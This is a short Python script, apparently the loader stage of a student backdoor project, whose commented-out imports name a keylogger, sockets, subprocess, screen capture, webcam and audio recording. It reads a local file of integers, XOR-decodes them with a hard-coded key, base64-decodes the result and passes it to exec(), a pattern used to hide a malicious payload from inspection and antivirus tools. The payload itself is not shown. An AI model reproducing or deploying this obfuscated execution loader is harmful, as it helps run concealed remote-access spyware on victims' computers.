import base64

# import ctypes
# import json
# import multiprocessing
# import os
# import pickle
# import shutil
# import socket
# import struct
# import subprocess
# import sys
# import threading
# import time
# import webbrowser

# import cv2
# import imutils
# import mss
# import requests
# import sounddevice
# from scipy.io.wavfile import write

# import keylogger


def xor(data, key):
    key = str(key)
    l = len(key)
    output_str = ""
    for i in range(len(data)):
        # current = data[i]
        # current_key = key[i % l]
        output_str += chr(data[i] ^ ord(key[i % l]))
    return output_str

KEY = "xamy"

ordd=""
with open("C:/Users/MSS/Desktop/semestre 6/shared_kali/roodkcab/mine/chipher", "r") as f:
    ordd=f.read()

ordd=ordd.split(' ')
ordd=[int(x) for x in ordd]
exec(base64.b64decode(xor(ordd, KEY)))
